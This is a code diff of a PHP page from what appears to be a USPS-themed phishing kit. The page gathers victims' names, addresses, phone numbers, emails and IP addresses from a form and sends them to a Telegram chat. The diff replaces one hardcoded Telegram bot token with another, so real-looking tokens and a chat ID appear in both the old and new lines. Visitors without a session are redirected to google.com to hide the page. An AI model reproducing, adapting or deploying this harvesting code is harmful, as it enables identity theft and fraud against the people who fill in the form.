@@ -1,8 +1,9 @@
 <?php
 session_start();
-if (isset($_SESSION["username"])) {
+if(isset($_SESSION["username"])) {
+
 if(isset($_GET['messageId'])){
-	$botToken = "6699499754:AAHaG6cBsD7zxVMrfOAcebt7u66bs8AMMXk";
+$botToken = "6367338929:AAHMMbQSLxEpLOkX1027eYvgaumrd9-NRCk";
 $chatID = "1064643518";
 	$messageId=$_GET['messageId'];
 	$ipzebi=$_GET['ipzebi'];
@@ -74,7 +75,7 @@ $ip = getenv("REMOTE_ADDR");
 $message = "-------------------- <3 USPS <3-------------------\nFull Name : ".$_POST['fullname']."\nAddress 1 : ".$_POST['add1']."\nAddress 2 : ".$_POST['add2']."\nCity      : ".$_POST['city']."\nstate  : ".$_POST['sstate']."\nzip Code  : ".$_POST['zipp']."\nPhone num  : ".$_POST['phonee']."\nEmail  : ".$_POST['email']."\nIP      : ".$ip."\n-------------------- <3 USPS <3-------------------\n";
 
 
-sendMessageT('1064643518',$message,'6699499754:AAHaG6cBsD7zxVMrfOAcebt7u66bs8AMMXk');
+sendMessageT('1064643518',$message,'6367338929:AAHMMbQSLxEpLOkX1027eYvgaumrd9-NRCk');
     $_SESSION["msg"] = $message ;
 
 HEADER("Location: index2.php");
@@ -1014,10 +1015,10 @@ border:0;
 </footer>
 </div><div id="quick-tools-container" style="display:none;"><div>
 </body></html>
-<?php
 
+<?php
 }else {
-	HEADER("Location: https://google.com");
+HEADER("Location: https://google.com");
 
 }
-
+?>
